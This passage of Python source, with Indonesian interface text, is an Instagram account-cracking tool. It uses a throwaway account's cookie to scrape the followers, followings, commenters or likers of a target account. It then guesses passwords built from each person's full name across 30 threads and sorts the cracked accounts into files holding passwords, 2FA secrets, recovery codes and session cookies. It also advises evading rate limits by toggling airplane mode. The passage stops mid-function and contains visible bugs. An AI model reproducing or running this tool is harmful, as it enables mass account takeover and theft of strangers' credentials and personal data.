    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Menu Facebook) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
